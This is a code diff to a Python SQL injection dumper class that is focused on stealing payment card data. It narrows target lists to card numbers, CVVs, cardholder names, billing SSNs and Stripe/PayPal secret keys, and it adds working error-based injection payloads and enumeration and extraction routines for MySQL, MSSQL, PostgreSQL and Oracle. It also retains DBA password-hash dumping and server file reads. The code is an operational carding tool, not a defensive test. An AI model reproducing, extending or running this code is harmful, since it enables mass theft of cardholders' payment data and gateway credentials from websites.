@@ -55,77 +55,55 @@ class SQLiDumper:
     
     # High-value table names (whitelist for targeted mode)
     TARGET_TABLES = {
+        # ---- Card / payment tables (highest priority) ----
         "cards": [
             "cards", "credit_cards", "creditcards", "cc", "card_info",
             "payment_cards", "billing_cards", "card_details", "carddata",
             "stored_cards", "customer_cards", "user_cards", "payment_methods",
+            "saved_cards", "card_tokens", "payment_profiles",
         ],
         "payments": [
             "payments", "payment", "transactions", "transaction", "orders",
             "order", "billing", "invoices", "invoice", "purchases",
             "checkout", "sales", "cart", "shopping_cart",
+            "sales_order_payment", "order_payment", "payment_info",
+            "payment_transaction", "payment_log", "payment_history",
+            "stripe_payments", "paypal_payments", "braintree_transactions",
         ],
-        "users": [
-            "users", "user", "members", "member", "accounts", "account",
-            "customers", "customer", "clients", "client", "admins", "admin",
-            "administrators", "login", "logins", "auth", "wp_users",
-            "user_accounts", "site_users", "tbl_users", "t_users",
-        ],
-        "config": [
-            "config", "configuration", "settings", "options", "wp_options",
-            "site_settings", "app_settings", "env", "environment",
-            "api_keys", "secrets", "credentials", "keys",
-        ],
-        # WordPress
-        "wordpress": [
-            "wp_users", "wp_usermeta", "wp_options", "wp_postmeta",
-            "wp_posts", "wp_comments", "wp_woocommerce_order_items",
-            "wp_wc_orders", "wp_woocommerce_payment_tokens",
-            "wp_wc_customer_lookup", "wp_woocommerce_api_keys",
-        ],
-        # Drupal
-        "drupal": [
-            "users_field_data", "user__roles", "config", "key_value",
-            "sessions", "flood", "watchdog",
-        ],
-        # Joomla
-        "joomla": [
-            "jos_users", "joomla_users", "j_users", "jos_session",
-            "jos_extensions", "jos_menu",
-        ],
-        # Magento
-        "magento": [
-            "admin_user", "customer_entity", "customer_entity_varchar",
-            "sales_order", "sales_order_payment", "core_config_data",
+        # ---- Gateway keys / config (Stripe, PayPal, etc.) ----
+        # NOTE: Only specific payment-related config tables — generic names like
+        # "config", "settings", "options" removed to avoid dumping CMS junk
+        "gateway_config": [
+            "wp_options",
+            "core_config_data", "site_settings",
+            "api_keys", "secrets", "credentials",
+            "payment_gateway", "payment_gateways", "gateway_settings",
+            "stripe_settings", "paypal_settings", "braintree_settings",
+            "wp_woocommerce_api_keys", "wp_woocommerce_payment_tokens",
             "vault_payment_token", "oauth_token",
+            "payment_config", "payment_settings",
         ],
-        # Generic e-commerce
-        "ecommerce": [
-            "products", "product", "inventory", "stock", "prices", "price",
-            "coupons", "coupon", "discounts", "gift_cards", "gift_card",
-            "subscriptions", "subscription", "plans", "plan",
-            "addresses", "address", "shipping_addresses",
+        # ---- WooCommerce payment-specific tables ----
+        "woo_payments": [
+            "wp_woocommerce_order_items", "wp_wc_orders",
+            "wp_woocommerce_payment_tokens", "wp_wc_order_stats",
+            "wp_wc_customer_lookup",
         ],
-        # Tokens / sessions / OAuth
-        "tokens": [
-            "tokens", "token", "oauth_tokens", "api_tokens", "access_tokens",
-            "refresh_tokens", "sessions", "session", "jwt_tokens",
-            "personal_access_tokens", "bearer_tokens",
-        ],
-        # Logs (may contain sensitive data)
-        "logs": [
-            "logs", "log", "audit_log", "activity_log", "access_log",
-            "login_attempts", "failed_logins", "password_resets",
+        # ---- Magento payment-specific tables ----
+        "magento_payments": [
+            "sales_order", "sales_order_payment", "sales_flat_order_payment",
+            "vault_payment_token", "customer_entity",
         ],
     }
     
-    # High-value column names (whitelist for targeted extraction)
+    # High-value column names — focused on cards, payments, and gateway keys
     TARGET_COLUMNS = {
         "card_data": [
             "card_number", "cardnumber", "card_num", "cardnum", "cc_number",
             "ccnumber", "cc_num", "ccnum", "pan", "pan_number", "credit_card",
             "creditcard", "card_no", "cardno", "account_number", "acct_number",
-            "debit_card", "card",
+            "debit_card", "card", "card_token", "payment_token",
+            "card_fingerprint", "card_last4", "last_four", "last4",
         ],
         "card_security": [
             "cvv", "cvc", "cvv2", "cvc2", "security_code", "securitycode",
@@ -140,19 +118,6 @@ class SQLiDumper:
             "cardholder", "card_holder", "cardholder_name", "name_on_card",
             "card_name", "billing_name", "holder_name",
         ],
-        "credentials": [
-            "password", "passwd", "pwd", "pass", "password_hash", "hash",
-            "hashed_password", "user_pass", "user_password", "login_password",
-            "secret", "pin", "passcode", "auth_token",
-        ],
-        "emails": [
-            "email", "email_address", "mail", "user_email", "e_mail",
-            "emailaddress", "contact_email",
-        ],
-        "usernames": [
-            "username", "user_name", "login", "user_login", "uname",
-            "user_id", "userid", "uid", "nickname", "display_name",
-        ],
         "gateway_keys": [
             "stripe_key", "stripe_secret", "pk_live", "sk_live",
             "publishable_key", "secret_key", "api_key", "apikey",
@@ -160,35 +125,18 @@ class SQLiDumper:
             "private_key", "public_key", "access_token", "auth_key",
             "braintree_key", "paypal_key", "paypal_secret",
             "client_id", "client_secret", "consumer_key", "consumer_secret",
-            "webhook_secret", "signing_secret",
+            "webhook_secret", "signing_secret", "payment_key",
+            "gateway_token", "gateway_key", "payment_secret",
         ],
         "billing": [
             "billing_address", "billing_city", "billing_state",
             "billing_zip", "billing_country", "billing_phone",
-            "address", "city", "state", "zip", "zipcode", "postal_code",
-            "country", "phone", "ssn", "social_security",
-            "tax_id", "ein", "dob", "date_of_birth", "birth_date",
+            "ssn", "social_security", "tax_id", "ein",
         ],
-        "tokens": [
-            "token", "access_token", "refresh_token", "api_token",
-            "auth_token", "jwt", "bearer_token", "session_token",
-            "reset_token", "activation_token", "verification_token",
-            "oauth_token", "csrf_token", "remember_token",
-        ],
-        "security": [
-            "security_question", "security_answer", "secret_question",
-            "secret_answer", "recovery_email", "backup_email",
-            "two_factor_secret", "totp_secret", "mfa_secret",
-            "backup_codes", "recovery_codes",
-        ],
-        "network": [
-            "ip_address", "ip", "last_login_ip", "registration_ip",
-            "user_agent", "last_user_agent", "session_id",
-            "last_login", "login_count", "failed_attempts",
-        ],
-        "phone": [
-            "phone", "phone_number", "mobile", "cell", "telephone",
-            "tel", "contact_number", "sms_number", "whatsapp",
+        "transaction": [
+            "amount", "total", "subtotal", "currency", "payment_status",
+            "payment_method", "payment_type", "transaction_id", "txn_id",
+            "order_total", "grand_total", "charge_id", "refund_amount",
         ],
     }
     
@@ -259,12 +207,30 @@ class SQLiDumper:
         os.makedirs(self.output_dir, exist_ok=True)
     
     def _is_target_table(self, table_name: str) -> bool:
-        """Check if table name matches any high-value target."""
-        table_lower = table_name.lower()
+        """Check if table name matches any high-value target.
+        
+        Matching rules:
+        1. Exact full-name match (e.g. "wp_options" == "wp_options")
+        2. Multi-word target: must appear as contiguous substring in table name
+           (e.g. "payment_gateway" in "my_payment_gateway_log")
+        3. Single-word target: must appear as a complete segment split on _/./-
+           (e.g. "payment" in "sales_payment" but NOT "files" in "payment_profiles")
+        """
+        table_lower = table_name.lower().strip()
+        segments = set(re.split(r'[_.\-]', table_lower))
         for category, names in self.TARGET_TABLES.items():
             for name in names:
-                if name in table_lower or table_lower in name:
+                # Exact full-name match
+                if name == table_lower:
                     return True
+                # Multi-word target: contiguous substring check
+                if '_' in name or '.' in name:
+                    if name in table_lower:
+                        return True
+                else:
+                    # Single-word target: must be a full segment
+                    if name in segments:
+                        return True
         return False
     
     def _is_target_column(self, column_name: str) -> Optional[str]:
@@ -295,8 +261,8 @@ class SQLiDumper:
                 cred_entry[col] = val
             elif category == "gateway_keys":
                 key_entry[col] = val
-            elif category == "billing":
-                card_entry[col] = val  # Billing goes with card data
+            elif category in ("billing", "transaction"):
+                card_entry[col] = val  # Billing/transaction goes with card data
         
         # Also check values for patterns regardless of column names
         for col, val in row.items():
@@ -389,6 +355,134 @@ class SQLiDumper:
         if suffix and not suffix.startswith(" "):
             return f" {suffix}"
         return suffix
+
+    async def _error_extract(self, sqli: SQLiResult, session: aiohttp.ClientSession,
+                              subquery: str) -> Optional[str]:
+        """Extract a single value using error-based injection.
+        
+        Tries multiple error-based techniques until one succeeds:
+        1. The technique that originally detected the SQLi
+        2. EXTRACTVALUE (cleanest extraction, ~32 char limit)
+        3. FLOOR/RAND (longer output, but regex can be tricky)
+        4. UPDATEXML (fallback)
+        
+        Args:
+            sqli: SQLiResult with error injection_type
+            session: aiohttp session
+            subquery: SQL subquery to extract (without outer parens)
+            
+        Returns:
+            Extracted string value, or None
+        """
+        scanner = self.scanner
+        base, params = scanner._parse_url(sqli.url)
+        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
+        
+        # Determine injection prefix from the payload that originally worked
+        payload_used = sqli.payload_used or ''
+        technique = getattr(sqli, 'technique', '') or ''
+        
+        if payload_used.startswith("'"):
+            prefix = "' AND "
+            suffix = '-- -'
+        elif payload_used.startswith('"'):
+            prefix = '" AND '
+            suffix = '-- -'
+        elif payload_used.lstrip().startswith('AND') or payload_used.lstrip().startswith('('):
+            prefix = ' AND '
+            suffix = '-- -'
+        else:
+            if original.lstrip('-').replace('.', '').isdigit():
+                prefix = ' AND '
+            else:
+                prefix = "' AND "
+            suffix = '-- -'
+        
+        # Build ordered list of techniques to try
+        injections = []
+        
+        if sqli.dbms in ("mysql", ""):
+            # Always try EXTRACTVALUE first (cleanest parsing, ~32 chars)
+            injections.append(f"{prefix}EXTRACTVALUE(1,CONCAT(0x7e,({subquery}),0x7e)) {suffix}")
+            # Then UPDATEXML
+            injections.append(f"{prefix}UPDATEXML(1,CONCAT(0x7e,({subquery}),0x7e),1) {suffix}")
+            # Then FLOOR/RAND (can extract more data but regex is fragile)
+            injections.append(
+                f"{prefix}(SELECT 1 FROM (SELECT COUNT(*),CONCAT("
+                f"({subquery}),FLOOR(RAND(0)*2))x FROM "
+                f"information_schema.tables GROUP BY x)a) {suffix}"
+            )
+        elif sqli.dbms == "mssql":
+            injections.append(f"{prefix}1=CONVERT(int,({subquery})) {suffix}")
+        elif sqli.dbms == "postgresql":
+            injections.append(f"{prefix}1=CAST(({subquery}) AS int) {suffix}")
+        elif sqli.dbms == "oracle":
+            injections.append(f"{prefix}1=CTXSYS.DRITHSX.SN(1,({subquery})) {suffix}")
+        else:
+            injections.append(f"{prefix}EXTRACTVALUE(1,CONCAT(0x7e,({subquery}),0x7e)) {suffix}")
+            injections.append(
+                f"{prefix}(SELECT 1 FROM (SELECT COUNT(*),CONCAT("
+                f"({subquery}),FLOOR(RAND(0)*2))x FROM "
+                f"information_schema.tables GROUP BY x)a) {suffix}"
+            )
+        
+        for injection in injections:
+            test_params = params.copy()
+            test_params[sqli.parameter] = [str(original) + injection]
+            test_url = scanner._build_url(base, test_params)
+            
+            body, _ = await scanner._fetch(test_url, session)
+            if not body:
+                continue
+            
+            val = self._parse_error_value(body)
+            if val:
+                return val
+        
+        return None
+
+    def _parse_error_value(self, body: str) -> Optional[str]:
+        """Extract value from an error message in the response body.
+        
+        Supports MySQL EXTRACTVALUE/UPDATEXML (~val~), FLOOR/RAND (Duplicate entry),
+        MSSQL CONVERT, PostgreSQL CAST error patterns.
+        """
+        # EXTRACTVALUE/UPDATEXML: ~data~
+        m = re.search(r"XPATH syntax error:\s*'~(.+?)~'", body, re.I)
+        if m:
+            return m.group(1).strip()
+        
+        # FLOOR/RAND: Duplicate entry 'data[0|1]' for key
+        # FLOOR(RAND(0)*2) appends 0 or 1 — use greedy match up to last digit before ' for key
+        m = re.search(r"Duplicate entry '(.+?)[01]' for key", body, re.I)
+        if m:
+            return m.group(1).strip()
+        
+        # MSSQL CONVERT
+        m = re.search(r"Conversion failed when converting.*?value '(.+?)'", body, re.I | re.S)
+        if m:
+            return m.group(1).strip()
+        
+        # PostgreSQL CAST
+        m = re.search(r'invalid input syntax for.*?"(.+?)"', body, re.I)
+        if m:
+            return m.group(1).strip()
+        
+        # Oracle CTXSYS
+        m = re.search(r'ORA-\d+.*?:(.*?)$', body, re.I | re.M)
+        if m:
+            val = m.group(1).strip()
+            if val and len(val) > 1:
+                return val
+        
+        # Generic: look for common error patterns with embedded data
+        m = re.search(r"(?:subquery returns|near) '(.+?)'", body, re.I)
+        if m:
+            val = m.group(1).strip()
+            if val and len(val) > 2:
+                return val
+        
+        return None
 
     async def enumerate_tables(self, sqli: SQLiResult, 
                                session: aiohttp.ClientSession) -> List[str]:
@@ -534,6 +628,66 @@ class SQLiDumper:
                 if tables:
                     logger.info(f"Fallback enumerated {len(tables)} tables from {base_url}")
         
+        # ── Error-based table enumeration ──
+        if not tables and sqli.injection_type == "error":
+            logger.info(f"Attempting error-based table enumeration for {base_url}")
+            if sqli.dbms in ("mysql", ""):
+                # Try GROUP_CONCAT first (returns up to ~1024 chars)
+                val = await self._error_extract(
+                    sqli, session,
+                    "SELECT GROUP_CONCAT(table_name SEPARATOR ',') "
+                    "FROM information_schema.tables WHERE table_schema=database()"
+                )
+                if val and ',' in val:
+                    tables = [t.strip() for t in val.split(',') if t.strip()]
+                elif val:
+                    tables = [val.strip()]
+                
+                # If GROUP_CONCAT was truncated or failed, try per-row
+                if not tables or (len(tables) == 1 and len(tables[0]) > 28):
+                    tables = []
+                    for i in range(50):
+                        val = await self._error_extract(
+                            sqli, session,
+                            f"SELECT table_name FROM information_schema.tables "
+                            f"WHERE table_schema=database() LIMIT {i},1"
+                        )
+                        if not val:
+                            break
+                        tables.append(val.strip())
+                        await asyncio.sleep(0.2)
+            
+            elif sqli.dbms == "mssql":
+                seen = set()
+                for i in range(50):
+                    not_in = ",".join(f"'{t}'" for t in seen) if seen else "''"
+                    val = await self._error_extract(
+                        sqli, session,
+                        f"SELECT TOP 1 table_name FROM information_schema.tables "
+                        f"WHERE table_type='BASE TABLE' AND table_name NOT IN ({not_in})"
+                    )
+                    if not val or val in seen:
+                        break
+                    tables.append(val.strip())
+                    seen.add(val.strip())
+                    await asyncio.sleep(0.2)
+            
+            elif sqli.dbms == "postgresql":
+                for i in range(50):
+                    val = await self._error_extract(
+                        sqli, session,
+                        f"SELECT tablename FROM pg_tables "
+                        f"WHERE schemaname='public' LIMIT 1 OFFSET {i}"
+                    )
+                    if not val:
+                        break
+                    tables.append(val.strip())
+                    await asyncio.sleep(0.2)
+            
+            tables = list(dict.fromkeys(tables))
+            if tables:
+                logger.info(f"Error-based enumerated {len(tables)} tables from {base_url}")
+
         logger.info(f"Enumerated {len(tables)} tables from {base_url}")
         return tables
 
@@ -634,13 +788,77 @@ class SQLiDumper:
                     if columns:
                         break
         
+        # ── Error-based column enumeration ──
+        if not columns and sqli.injection_type == "error":
+            logger.info(f"Attempting error-based column enumeration for table '{table}'")
+            # Use hex encoding for table name to avoid quote conflicts in injection
+            table_hex = f"0x{table.encode().hex()}"
+            
+            if sqli.dbms in ("mysql", ""):
+                # Try GROUP_CONCAT first
+                val = await self._error_extract(
+                    sqli, session,
+                    f"SELECT GROUP_CONCAT(column_name SEPARATOR 0x2c) "
+                    f"FROM information_schema.columns "
+                    f"WHERE table_schema=database() AND table_name={table_hex}"
+                )
+                if val and ',' in val:
+                    columns = [c.strip() for c in val.split(',') if c.strip()]
+                elif val:
+                    columns = [val.strip()]
+                
+                # Per-row fallback if GROUP_CONCAT truncated
+                if not columns or (len(columns) == 1 and len(columns[0]) > 28):
+                    columns = []
+                    for i in range(60):
+                        val = await self._error_extract(
+                            sqli, session,
+                            f"SELECT column_name FROM information_schema.columns "
+                            f"WHERE table_schema=database() AND table_name={table_hex} LIMIT {i},1"
+                        )
+                        if not val:
+                            break
+                        columns.append(val.strip())
+                        await asyncio.sleep(0.15)
+            
+            elif sqli.dbms == "mssql":
+                seen = set()
+                for i in range(60):
+                    not_in = ",".join(f"'{c}'" for c in seen) if seen else "''"
+                    val = await self._error_extract(
+                        sqli, session,
+                        f"SELECT TOP 1 column_name FROM information_schema.columns "
+                        f"WHERE table_name={table_hex} AND column_name NOT IN ({not_in})"
+                    )
+                    if not val or val in seen:
+                        break
+                    columns.append(val.strip())
+                    seen.add(val.strip())
+                    await asyncio.sleep(0.15)
+            
+            elif sqli.dbms == "postgresql":
+                for i in range(60):
+                    val = await self._error_extract(
+                        sqli, session,
+                        f"SELECT column_name FROM information_schema.columns "
+                        f"WHERE table_name={table_hex} LIMIT 1 OFFSET {i}"
+                    )
+                    if not val:
+                        break
+                    columns.append(val.strip())
+                    await asyncio.sleep(0.15)
+            
+            columns = list(dict.fromkeys(columns))
+            if columns:
+                logger.info(f"Error-based enumerated {len(columns)} columns from '{table}'")
+
         columns = list(dict.fromkeys(columns))
         logger.info(f"Enumerated {len(columns)} columns from table '{table}'")
         return columns
 
     async def extract_data(self, sqli: SQLiResult, table: str, columns: List[str],
                            session: aiohttp.ClientSession, limit: int = None) -> List[Dict]:
-        """Extract actual data from a table using union injection.
+        """Extract actual data from a table using union or error-based injection.
         
         Args:
             sqli: SQLi vulnerability result
@@ -659,6 +877,109 @@ class SQLiDumper:
         scanner = self.scanner
         base, params = scanner._parse_url(sqli.url)
         original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
+        
+        # ── Error-based extraction ──
+        if sqli.injection_type == "error":
+            logger.info(f"Error-based data extraction from {table} ({len(columns)} cols, limit={limit})")
+            max_err_rows = min(limit, 30)  # Error-based is slow, cap at 30
+            
+            if sqli.dbms in ("mysql", ""):
+                # Extract row by row, column by column via CONCAT
+                for row_idx in range(max_err_rows):
+                    # Build CONCAT of all columns
+                    concat_parts = ",".join([f"IFNULL({c},'NULL')" for c in columns])
+                    val = await self._error_extract(
+                        sqli, session,
+                        f"SELECT CONCAT_WS(0x7c7c,{concat_parts}) FROM {table} LIMIT {row_idx},1"
+                    )
+                    if not val:
+                        # CONCAT may be too long for error (~32 char limit), try column-by-column
+                        if row_idx == 0 and len(columns) > 2:
+                            row = {}
+                            for col in columns:
+                                cval = await self._error_extract(
+                                    sqli, session,
+                                    f"SELECT IFNULL({col},'NULL') FROM {table} LIMIT {row_idx},1"
+                                )
+                                if cval is not None:
+                                    row[col] = cval
+                                await asyncio.sleep(0.1)
+                            if row:
+                                rows.append(row)
+                                # Continue column-by-column for remaining rows
+                                for ri in range(1, max_err_rows):
+                                    rw = {}
+                                    for col in columns:
+                                        cv = await self._error_extract(
+                                            sqli, session,
+                                            f"SELECT IFNULL({col},'NULL') FROM {table} LIMIT {ri},1"
+                                        )
+                                        if cv is not None:
+                                            rw[col] = cv
+                                        await asyncio.sleep(0.1)
+                                    if not rw:
+                                        break
+                                    rows.append(rw)
+                        break
+                    
+                    values = val.split("||")
+                    if len(values) == len(columns):
+                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
+                        rows.append(row)
+                    elif len(values) > len(columns):
+                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
+                        rows.append(row)
+                    else:
+                        # Partial data — still useful
+                        row = {}
+                        for i, v in enumerate(values):
+                            if i < len(columns):
+                                row[columns[i]] = v.strip()
+                        if row:
+                            rows.append(row)
+                    await asyncio.sleep(0.2)
+            
+            elif sqli.dbms == "mssql":
+                for row_idx in range(max_err_rows):
+                    concat_parts = "+CHAR(124)+CHAR(124)+".join(
+                        [f"ISNULL(CAST({c} AS VARCHAR(MAX)),'NULL')" for c in columns]
+                    )
+                    not_in = ""
+                    if rows:
+                        # Use first column as filter to get next rows
+                        seen = [r.get(columns[0], '') for r in rows]
+                        not_in = f" AND {columns[0]} NOT IN ({','.join(repr(s) for s in seen)})"
+                    val = await self._error_extract(
+                        sqli, session,
+                        f"SELECT TOP 1 {concat_parts} FROM {table} WHERE 1=1{not_in}"
+                    )
+                    if not val:
+                        break
+                    values = val.split("||")
+                    if len(values) >= len(columns):
+                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
+                        rows.append(row)
+                    await asyncio.sleep(0.2)
+            
+            elif sqli.dbms == "postgresql":
+                for row_idx in range(max_err_rows):
+                    concat_parts = "||CHR(124)||CHR(124)||".join(
+                        [f"COALESCE(CAST({c} AS TEXT),'NULL')" for c in columns]
+                    )
+                    val = await self._error_extract(
+                        sqli, session,
+                        f"SELECT {concat_parts} FROM {table} LIMIT 1 OFFSET {row_idx}"
+                    )
+                    if not val:
+                        break
+                    values = val.split("||")
+                    if len(values) >= len(columns):
+                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
+                        rows.append(row)
+                    await asyncio.sleep(0.2)
+            
+            logger.info(f"Error-based extracted {len(rows)} rows from {table}")
+            return rows
         
         if sqli.injection_type != "union" or not sqli.injectable_columns:
             return rows
@@ -878,8 +1199,60 @@ class SQLiDumper:
                 if found_any:
                     break
         
+        # Filter injection echo artifacts from extracted rows
+        rows = self._filter_echo_rows(rows)
         logger.info(f"Extracted {len(rows)} rows from {table} ({', '.join(columns[:5])}...)")
         return rows
+
+    # SQL injection artifact patterns — if a data value matches these,
+    # it's the injection payload echoing back, not real data
+    _SQLI_ECHO_PATTERNS = re.compile(
+        r'(?:ORDER\s+BY|UNION\s+(?:ALL\s+)?SELECT|GROUP\s+BY|HAVING|'
+        r'CONCAT\s*\(|INFORMATION_SCHEMA|IFNULL\s*\(|COALESCE\s*\(|'
+        r'CHAR\s*\(\d+\)|0x[0-9a-f]{6,}|LIMIT\s+\d+|OFFSET\s+\d+|'
+        r'SELECT\s+.*\s+FROM\s+|INSERT\s+INTO|UPDATE\s+.*\s+SET|'
+        r'DELETE\s+FROM|DROP\s+TABLE|AND\s+1\s*=\s*[12]|'
+        r'--\s*-|/\*.*\*/)',
+        re.IGNORECASE
+    )
+
+    @staticmethod
+    def _is_injection_echo(value: str) -> bool:
+        """Check if a data value is actually an injection payload echo."""
+        if not value or len(value) < 5:
+            return False
+        v = value.strip()
+        # If >40% of the value is SQL keywords, it's an echo
+        sql_kw_count = len(SQLiDumper._SQLI_ECHO_PATTERNS.findall(v))
+        if sql_kw_count >= 2:
+            return True
+        # Single keyword but it IS the entire value
+        if sql_kw_count == 1 and len(v) < 60:
+            return True
+        return False
+
+    def _filter_echo_rows(self, rows: List[Dict]) -> List[Dict]:
+        """Remove rows that are injection payload echoes."""
+        clean = []
+        for row in rows:
+            has_real_value = False
+            row_is_echo = False
+            for col, val in row.items():
+                if col == '_table':
+                    continue
+                v = str(val).strip() if val else ''
+                if not v or v.lower() in ('null', 'none', ''):
+                    continue
+                if self._is_injection_echo(v):
+                    row_is_echo = True
+                    break
+                has_real_value = True
+            if has_real_value and not row_is_echo:
+                clean.append(row)
+        if len(rows) != len(clean):
+            logger.info(f"Filtered {len(rows)-len(clean)} injection-echo rows "
+                       f"(kept {len(clean)}/{len(rows)})")
+        return clean
 
     async def dios_dump(self, sqli: SQLiResult, 
                         session: aiohttp.ClientSession) -> Optional[str]:
@@ -1278,37 +1651,61 @@ class SQLiDumper:
             database=sqli.current_db or "",
         )
         
+        import time as _time
+        _dump_start = _time.monotonic()
+        _DUMP_MAX_SECS = 300  # Internal dump budget — 5 minutes for thorough card/payment extraction
+        
         # Step 1: Enumerate tables
         all_tables = await self.enumerate_tables(sqli, session)
         if not all_tables:
             logger.warning(f"No tables found for {sqli.url}")
             return dump
         
-        # Step 2: Filter to high-value targets
+        # Step 2: Filter to card/payment/gateway targets ONLY
         target_tables = [t for t in all_tables if self._is_target_table(t)]
         if not target_tables:
-            # If no obvious targets, try first 10 tables
-            target_tables = all_tables[:10]
-            logger.info(f"No high-value tables matched, checking first {len(target_tables)}")
+            # No card/payment tables found — log all table names for review and bail
+            logger.info(f"No card/payment tables matched from {len(all_tables)} tables: {all_tables[:20]}")
+            # Still store schema info for the dump report
+            dump.raw_dumps.append(f"=== ALL TABLES (no card/payment match) ===\n{','.join(all_tables)}")
+            return dump
         else:
-            logger.info(f"Found {len(target_tables)} high-value tables: {target_tables}")
+            # Cap at 8 high-value tables to stay within timeout
+            if len(target_tables) > 8:
+                logger.info(f"Found {len(target_tables)} high-value tables, capping at 8: {target_tables[:8]}")
+                target_tables = target_tables[:8]
+            else:
+                logger.info(f"Found {len(target_tables)} high-value tables: {target_tables}")
         
         # Step 3+4: Enumerate columns and extract data for each target table
         for table in target_tables:
+            # Check dump budget
+            if _time.monotonic() - _dump_start > _DUMP_MAX_SECS:
+                logger.info(f"Dump time budget ({_DUMP_MAX_SECS}s) reached after "
+                           f"{len(dump.data)} tables extracted — skipping remaining")
+                break
+            
             columns = await self.enumerate_columns(sqli, table, session)
             if not columns:
                 continue
             
             dump.tables[table] = columns
             
-            # Filter to high-value columns
+            # Filter to high-value columns — but for card/payment tables, extract all
             target_cols = []
             for col in columns:
                 if self._is_target_column(col):
                     target_cols.append(col)
             
-            # If no specific targets, take all columns (might have non-obvious names)
-            extract_cols = target_cols if target_cols else columns[:15]
+            # STRICT: Only extract if we found card/payment/key columns.
+            # If no target columns found, skip this table entirely to avoid
+            # dumping random CMS junk (thumbnails, blog posts, etc.)
+            if not target_cols:
+                logger.info(f"Skipping table '{table}' — no card/payment/key columns "
+                           f"among {len(columns)} cols: {columns[:8]}")
+                continue
+            
+            extract_cols = target_cols
             
             # Extract data
             rows = await self.extract_data(sqli, table, extract_cols, session)
@@ -1325,8 +1722,13 @@ class SQLiDumper:
             # Small delay between tables
             await asyncio.sleep(0.5)
         
-        # Step 5: Try DIOS dump as backup
-        dios_raw = await self.dios_dump(sqli, session)
+        # Step 5: Try DIOS dump as backup (skip if running low on time)
+        dios_raw = None
+        _elapsed = _time.monotonic() - _dump_start
+        if _elapsed < _DUMP_MAX_SECS - 15:
+            dios_raw = await self.dios_dump(sqli, session)
+        else:
+            logger.info(f"Time budget {_elapsed:.0f}s/{_DUMP_MAX_SECS}s — skipping DIOS dump")
         if dios_raw:
             dump.raw_dumps.append(dios_raw)
             
@@ -1339,30 +1741,34 @@ class SQLiDumper:
                     dump.tables[table].append(column)
         
         # Step 6: Advanced extraction — privileges, databases, hashes, file reads
-        try:
-            privs = await self.check_privileges(sqli, session)
-            if privs:
-                dump.raw_dumps.append(f"=== PRIVILEGES ===\n{json.dumps(privs, indent=2)}")
+        _elapsed = _time.monotonic() - _dump_start
+        if _elapsed >= _DUMP_MAX_SECS - 10:
+            logger.info(f"Time budget {_elapsed:.0f}s/{_DUMP_MAX_SECS}s — skipping advanced extraction")
+        else:
+            try:
+                privs = await self.check_privileges(sqli, session)
+                if privs:
+                    dump.raw_dumps.append(f"=== PRIVILEGES ===\n{json.dumps(privs, indent=2)}")
+                    
+                    # If DBA, try to get password hashes
+                    if privs.get("is_dba") == "DBA":
+                        hashes = await self.dump_password_hashes(sqli, session)
+                        if hashes:
+                            dump.raw_dumps.append(f"=== DB PASSWORD HASHES ===\n{hashes}")
+                    
+                    # Enumerate all databases
+                    all_dbs = await self.enumerate_databases(sqli, session)
+                    if all_dbs:
+                        dump.raw_dumps.append(f"=== ALL DATABASES ===\n{','.join(all_dbs)}")
                 
-                # If DBA, try to get password hashes
-                if privs.get("is_dba") == "DBA":
-                    hashes = await self.dump_password_hashes(sqli, session)
-                    if hashes:
-                        dump.raw_dumps.append(f"=== DB PASSWORD HASHES ===\n{hashes}")
-                
-                # Enumerate all databases
-                all_dbs = await self.enumerate_databases(sqli, session)
-                if all_dbs:
-                    dump.raw_dumps.append(f"=== ALL DATABASES ===\n{','.join(all_dbs)}")
-            
-            # Try to read server files (only if DBA or MySQL with FILE priv)
-            if privs.get("is_dba") == "DBA" or sqli.dbms == "mysql":
-                files = await self.auto_file_read(sqli, session)
-                if files:
-                    for fpath, content in files.items():
-                        dump.raw_dumps.append(f"=== FILE: {fpath} ===\n{content[:5000]}")
-        except Exception as e:
-            logger.debug(f"Advanced extraction error: {e}")
+                # Try to read server files (only if DBA or MySQL with FILE priv)
+                if privs and (privs.get("is_dba") == "DBA" or sqli.dbms == "mysql"):
+                    files = await self.auto_file_read(sqli, session)
+                    if files:
+                        for fpath, content in files.items():
+                            dump.raw_dumps.append(f"=== FILE: {fpath} ===\n{content[:5000]}")
+            except Exception as e:
+                logger.debug(f"Advanced extraction error: {e}")
         
         logger.info(f"Targeted dump complete for {sqli.url}: "
                     f"{len(dump.card_data)} card entries, "
@@ -1493,7 +1899,7 @@ class SQLiDumper:
             logger.warning("Blind dumper not initialized")
             return DumpedData(url=sqli.url, dbms=sqli.dbms or "unknown")
         
-        if sqli.injection_type not in ("boolean", "time"):
+        if sqli.injection_type not in ("boolean", "time", "error"):
             logger.warning(f"blind_targeted_dump called with {sqli.injection_type}, skipping")
             return DumpedData(url=sqli.url, dbms=sqli.dbms or "unknown")
         
